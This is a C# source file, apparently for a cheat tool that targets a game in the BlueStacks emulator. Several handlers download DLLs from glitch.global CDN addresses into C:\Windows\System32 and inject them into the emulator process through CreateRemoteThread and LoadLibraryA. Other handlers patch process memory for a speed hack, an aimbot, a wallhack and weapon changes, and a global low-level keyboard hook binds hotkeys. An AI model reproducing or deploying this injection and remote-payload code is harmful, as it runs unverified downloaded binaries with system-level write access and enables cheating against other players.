                    //Type Here Emulator Not Found
                    start.Text = "Emulator Not Found";
                    Console.Beep(240, 300);
                }
                else
                {
                    string dllName = "blue.dll";
                    ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                    string adress = "https://cdn.glitch.global/8654c83d-9f66-4ec4-8395-714048921e0b/blue.dll?v=1739285515726";
                    string fileName = $"C:\\Windows\\System32\\{dllName}";
                    bool flag = File.Exists(fileName);

                    if (flag)
                    {
                        File.Delete(fileName);
                    }
                    this.webclient.DownloadFile(adress, fileName);
                    Process targetProcess = Process.GetProcessesByName("HD-Player").FirstOrDefault();
                    if (targetProcess != null)
                    {
                        start.Text = "Chams Injected";
                    }
                    IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
                    IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                    IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                    UIntPtr bytesWritten;
                    WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
                    CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
                }
            }
            catch
            {
                Console.Beep(240, 300);
                start.Text = "Chams Already Injected";
            }
        }

        private void label9_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button2_Click_1(object sender, EventArgs e)
        {

        }

        private void guna2Button10_Click(object sender, EventArgs e)
        {

        }

        private void start_Click(object sender, EventArgs e)
        {

        }

        private  void guna2Button27_Click(object sender, EventArgs e)
        {
        }

        private void guna2ToggleSwitch19_CheckedChanged(object sender, EventArgs e)
        {

            try
            {
                if (System.Diagnostics.Process.GetProcessesByName("HD-Player").Length == 0)
                {
                    //Type Here Emulator Not Found
                    start.Text = "Emulator Not Found";
                    Console.Beep(240, 300);
                }
                else
                {
                    string dllName = "moco.ll.dll";
                    ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                    string adress = "https://cdn.glitch.global/5b1d4c88-e5ca-4d64-b877-3928e257afcf/moco.ll.dll?v=1726211356695";
                    string fileName = $"C:\\Windows\\System32\\{dllName}";
                    bool flag = File.Exists(fileName);

                    if (flag)
                    {
                        File.Delete(fileName);
                    }
                    this.webclient.DownloadFile(adress, fileName);
                    System.Diagnostics.Process targetProcess = System.Diagnostics.Process.GetProcessesByName("HD-Player").FirstOrDefault();
                    if (targetProcess != null)
                    {
                        start.Text = "Chams Injected";
                    }
                    IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
                    IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                    IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                    UIntPtr bytesWritten;
                    WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
                    CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
                }
            }
            catch
            {
                Console.Beep(240, 300);
                start.Text = "Chams Already Injected";
            }
        }
        private List<long> speedHackAddresses = new List<long>();


        private async void guna2ToggleSwitch22_CheckedChanged(object sender, EventArgs e)
        {
            string search = "1A 00 00 00 69 00 6E 00 67 00 61 00 6D 00 65 00 2F 00 70 00 69 00 63 00 6B 00 75 00 70 00 2F 00 70 00 69 00 63 00 6B 00 75 00 70 00 5F 00 76 00 73 00 6B";
            string replace = "1D 00 00 00 65 00 66 00 66 00 65 00 63 00 74 00 73 00 2F 00 76 00 66 00 78 00 5F 00 69 00 6E 00 61 00 67 00 6D 00 65 00 5F 00 6C 00 61 00 73 00 65 00 72 00 5F 00 73 00 68 00 6F 00 70 00";
            MemLib = new Falcon_Memory();
            MemLib.OpenProcess("HD-Player");


            IEnumerable<long> wl = await MemLib.AoBScan(search, writable: true);

            if (wl.Any())
            {
                foreach (var address in wl)
                {
                    MemLib.WriteMemory(address.ToString("X"), "bytes", replace);
                }

            }
            start.Text = "Applied VSK";
        }
        private void ToggleSpeedHack()
        {
            if (!speedHackAddresses.Any())
            {
                MessageBox.Show("No addresses found. Please scan first.");
                return;
            }

            string searchValue = "01 00 00 00 02 2B 07 3D";
            string replaceValue = "01 00 00 00 92 E4 60 3D";

            if (guna2ToggleSwitch20.Checked)
            {
                (searchValue, replaceValue) = (replaceValue, searchValue);
            }

            try
            {
                foreach (var address in speedHackAddresses)
                {
                    MemLib.WriteMemory(address.ToString("X"), "bytes", replaceValue);
                }

                start.Text = guna2ToggleSwitch20.Checked ? "Speed Enabled" : "Speed Disabled";
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error during memory write: {ex.Message}");
            }
        }
        private async Task ToggleSpeedAsync()
        {
            if (MemLib == null)
            {
                MemLib = new Falcon_Memory();
                MemLib.OpenProcess("HD-Player");
            }

            string search, replace;
            if (guna2ToggleSwitch20.Checked)
            {
                search = "01 00 00 00 02 2B 07 3D";
                replace = "01 00 00 00 92 E4 60 3D";
                start.Text = "Applying Speed...";
            }
            else
            {
                search = "01 00 00 00 92 E4 60 3D";
                replace = "01 00 00 00 02 2B 07 3D";
                start.Text = "Disabling Speed...";
            }

            // Perform memory scan once and store addresses
            var addresses = await MemLib.AoBScan(search, writable: true);

            if (addresses != null && addresses.Any())
            {
                // Parallel memory writing
                Parallel.ForEach(addresses, address =>
                {
                    MemLib.WriteMemory(address.ToString("X"), "bytes", replace);
                });

                Console.Beep(400, 200);
                start.Text = guna2ToggleSwitch20.Checked ? "Applied Speed" : "Disabled Speed";
            }
            else
            {
                start.Text = "No Addresses Found!";
            }
        }

        private async void guna2ToggleSwitch20_CheckedChanged(object sender, EventArgs e)
        {
            await ToggleSpeedAsync();
        }

        private void guna2Button31_Click(object sender, EventArgs e)
        {

        }

        private async void guna2ToggleSwitch21_CheckedChanged(object sender, EventArgs e)
        {
            if (guna2ToggleSwitch21.Checked)
            {

                string search = "43 00 00 28 42 00 00 B4 42 78 00 00 00 00 00 00 00 9A 99 19 3F 00 00 80 3E 00 00 00 00 04 00 00 00 00 00 80 3F 00 00 20 41 00 00 34 42 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 80 3F CD CC 4C 3F CD CC 8C 3F 00 00 80 3F 00 00 00";
                string replace = "43 00 00 28 42 00 00 B4 42 78 00 00 00 00 00 00 00 9A 99 19 1C 00 00 80 3E 00 00 00 00 04 00 00 00 00 00 80 3F 00 00 20 41 00 00 34 42 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 80 3F CD CC 4C 3F CD CC 8C 3F 00 00 80 3F 00 00 00";

                if (System.Diagnostics.Process.GetProcessesByName("HD-Player").Length == 0)
                {

                    return;  // Exit if no emulator is found
                }
                MemLib = new Falcon_Memory();
                MemLib.OpenProcess("HD-Player");
                // Append failure message with a timestamp


                IEnumerable<long> wl = await MemLib.AoBScan(search, writable: true);

                if (wl.Any())
                {
                    foreach (var address in wl)
                    {
                        MemLib.WriteMemory(address.ToString("X"), "bytes", replace);
                    }



                }

                start.Text = "Applied M82B Switch";
                Console.Beep(400, 200);
            }
            else
            {

                string search = "43 00 00 28 42 00 00 B4 42 78 00 00 00 00 00 00 00 9A 99 19 1C 00 00 80 3E 00 00 00 00 04 00 00 00 00 00 80 3F 00 00 20 41 00 00 34 42 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 80 3F CD CC 4C 3F CD CC 8C 3F 00 00 80 3F 00 00 00";
                string replace = "43 00 00 28 42 00 00 B4 42 78 00 00 00 00 00 00 00 9A 99 19 3F 00 00 80 3E 00 00 00 00 04 00 00 00 00 00 80 3F 00 00 20 41 00 00 34 42 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 80 3F CD CC 4C 3F CD CC 8C 3F 00 00 80 3F 00 00 00";

                if (Process.GetProcessesByName("HD-Player").Length == 0)
                {

                    return;  // Exit if no emulator is found
                }
                MemLib = new Falcon_Memory();
                MemLib.OpenProcess("HD-Player");
                // Append failure message with a timestamp


                IEnumerable<long> wl = await MemLib.AoBScan(search, writable: true);

                if (wl.Any())
                {
                    foreach (var address in wl)
                    {
                        MemLib.WriteMemory(address.ToString("X"), "bytes", replace);
                    }



                }
                else
                {
                    // Append failure message with a timestamp


                }
                start.Text = "Disabled M82B Switch";
                Console.Beep(400, 200);
            }
        }

        private void guna2Button30_Click(object sender, EventArgs e)
        {

        }
        private void Application_ApplicationExit(object sender, EventArgs e)
        {
            if (hookID != IntPtr.Zero)
            {
                UnhookWindowsHookEx(hookID);
            }
        }


        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                IntPtr moduleHandle = GetModuleHandle(curModule.ModuleName);
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, moduleHandle, 0);
            }
        }
      
        private const int WM_SYSKEYDOWN = 0x0104;
        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam); // Read virtual key code
                Keys pressedKey = (Keys)vkCode;

                // Button 32 keybinding setting logic
                if (waitPressKey32)
                {
                    guna2Button32.ForeColor = Color.Black;
                    guna2Button32.FillColor = Color.White;

                    guna2Button32.Text = pressedKey == Keys.Escape ? "None" : pressedKey.ToString();
                    waitPressKey32 = false;
                }
                // Button 33 keybinding setting logic
                else if (waitPressKey33)
                {
                    guna2Button33.ForeColor = Color.Black;
                    guna2Button33.FillColor = Color.White;

                    guna2Button33.Text = pressedKey == Keys.Escape ? "None" : pressedKey.ToString();
                    waitPressKey33 = false;
                }
                else
                {
                    // Execute bound functions
                    if (IsKeyBound(guna2Button32.Text, pressedKey))
                    {
                        ToggleWallHack();
                    }
                    else if (IsKeyBound(guna2Button33.Text, pressedKey))
                    {
                        guna2ToggleSwitch20.Checked = !guna2ToggleSwitch20.Checked;
                    }
                }
            }

            return CallNextHookEx(hookID, nCode, wParam, lParam);
        }

        private bool IsKeyBound(string keyText, Keys pressedKey)
        {
            if (keyText == "None" || string.IsNullOrWhiteSpace(keyText))
                return false;

            Keys boundKey;
            return Enum.TryParse(keyText, out boundKey) && boundKey == pressedKey;
        }

        private void guna2TextBox1_TextChanged_1(object sender, EventArgs e)
        {
           
        }
       
        private bool waitPressKey32 = false;
        private bool waitPressKey33 = false;
        private void guna2Button32_Click(object sender, EventArgs e)
        {
            guna2Button32.FillColor = Color.FromArgb(20, 20, 20);
            guna2Button32.ForeColor = Color.White;
            guna2Button32.Text = "...";
            waitPressKey32 = true;
        }

        private void guna2Button33_Click(object sender, EventArgs e)
        {
            guna2Button33.FillColor = Color.FromArgb(20, 20, 20);
            guna2Button33.ForeColor = Color.White;
            guna2Button33.Text = "...";
            waitPressKey33 = true;
        }

        private async void guna2Button34_Click(object sender, EventArgs e)
        {
            originallValues.Clear();
            originalValues.Clear();
            originallValues2.Clear();
            originalValues2.Clear();
            try
            {
                var process = Process.GetProcessesByName("HD-Player").FirstOrDefault();
                if (process == null)
                {
                    start.Text = "HD-Player not found.";
                    return;
                }

                Memlib.OpenProcess(process.Id);
                var result = await Memlib.AoBScan2(aimbAOB, writable: true, executable: true);
                if (result == null || !result.Any())
                {
                    start.Text = "No Matching Address.";
                    return;
                }

                result = result.Where(addr => addr >= 0x10000 && addr <= 0x7ffffffeffff).ToList();
                cachedAddresses = result.ToList(); 

                start.Text = "Aimbot Scanned Successfully!";
                Console.Beep(500, 200);
            }
            catch (Exception ex)
            {
                start.Text = $"Error: {ex.Message}";
            }
        }

        private void label12_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button12_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button8_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button7_Click(object sender, EventArgs e)
        {

        }

        private void guna2Separator1_Click_1(object sender, EventArgs e)
        {

        }

        private void guna2Button28_Click(object sender, EventArgs e)
        {

        }

        private void label11_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button13_Click(object sender, EventArgs e)
        {

        }

        private void guna2Separator3_Click_3(object sender, EventArgs e)
        {

        }

        private void guna2Button11_Click(object sender, EventArgs e)
        {

        }

        private void guna2TabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void tabPage1_Click(object sender, EventArgs e)
        {

        }

        private void label13_Click_1(object sender, EventArgs e)
        {

        }

        private void guna2Button5_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button3_Click_1(object sender, EventArgs e)
        {

        }

        private void guna2Separator2_Click(object sender, EventArgs e)
        {

        }

        private void tabPage2_Click(object sender, EventArgs e)
        {

        }

        private void tabPage3_Click(object sender, EventArgs e)
        {

        }

        private void label14_Click_1(object sender, EventArgs e)
        {

        }

        private void guna2Button23_Click(object sender, EventArgs e)
        {

        }

        private void guna2Separator6_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button22_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button20_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button21_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button19_Click(object sender, EventArgs e)
        {

        }

        private void label9_Click_1(object sender, EventArgs e)
        {

        }

        private void guna2Button17_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button16_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button14_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button15_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button18_Click(object sender, EventArgs e)
        {

        }

        private void tabPage4_Click_1(object sender, EventArgs e)
        {

        }

        private void guna2Separator7_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button29_Click_1(object sender, EventArgs e)
        {

        }

        private void label15_Click(object sender, EventArgs e)
        {

        }

        private void label21_Click(object sender, EventArgs e)
        {

        }

        private void label24_Click(object sender, EventArgs e)
        {

        }

        private void label23_Click(object sender, EventArgs e)
        {

        }

        private void label22_Click(object sender, EventArgs e)
        {

        }

        private void EXPIRYDATE_Click(object sender, EventArgs e)
        {

        }

        private void label3_Click_1(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void guna2Separator4_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button25_Click(object sender, EventArgs e)
        {

        }

        private void label7_Click_1(object sender, EventArgs e)
        {

        }

        private void label10_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button35_Click(object sender, EventArgs e)
        {

        }

        private void guna2ToggleSwitch22_CheckedChanged_1(object sender, EventArgs e)
        {
            try
            {
                if (System.Diagnostics.Process.GetProcessesByName("HD-Player").Length == 0)
                {
                    //Type Here Emulator Not Found
                    start.Text = "Emulator Not Found";
                    Console.Beep(240, 300);
                }
                else
                {
                    string dllName = "skin_2d.dll";
                    ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                    string adress = "https://cdn.glitch.global/8654c83d-9f66-4ec4-8395-714048921e0b/skin_2d.dll?v=1739285566098";
                    string fileName = $"C:\\Windows\\System32\\{dllName}";
                    bool flag = File.Exists(fileName);

                    if (flag)
                    {
                        File.Delete(fileName);
                    }
                    this.webclient.DownloadFile(adress, fileName);
                    System.Diagnostics.Process targetProcess = System.Diagnostics.Process.GetProcessesByName("HD-Player").FirstOrDefault();
                    if (targetProcess != null)
                    {
                        start.Text = "Chams Injected";
                    }
                    IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
                    IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                    IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                    UIntPtr bytesWritten;
                    WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
                    CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
                }
            }
            catch
            {
                Console.Beep(240, 300);
                start.Text = "Chams Already Injected";
            }
        }

        private void guna2Button36_Click(object sender, EventArgs e)
        {

        }

        private async void guna2Button37_Click(object sender, EventArgs e)
        {

            Int32 proc = Process.GetProcessesByName("HD-Player")[0].Id;
            Memlib.OpenProcess(proc);

            var enumerable = await Memlib.AoBScan(0x0000000000010000, 0x00007ffffffeffff, "AE 65 14 06 71 23 05 06 72 23 05 06 B3 65 14 06 46 23 05 06 4F 23 05 06 85 65 14 06 9B 65 14 06 4B 23 05 06 57 23 05 06 8C 65 14 06 94 65 14 06 8F 65 14 06 AB 65 14 06 90 65 14 06 AA 65 14 06 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00", true, true, string.Empty);
           
            foreach (long num in enumerable)
            {
                Memlib.WriteMemory(num.ToString("X"), "bytes", "AE 65 14 06 85 65 14 06 85 65 14 06 B3 65 14 06 85 65 14 06 85 65 14 06 85 65 14 06 9B 65 14 06 85 65 14 06 85 65 14 06 8C 65 14 06 94 65 14 06 8F 65 14 06 AB 65 14 06 90 65 14 06 AA 65 14 06 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00", string.Empty, null);
            }
            start.Text = "Female Removed Successfully";
        }
    }
}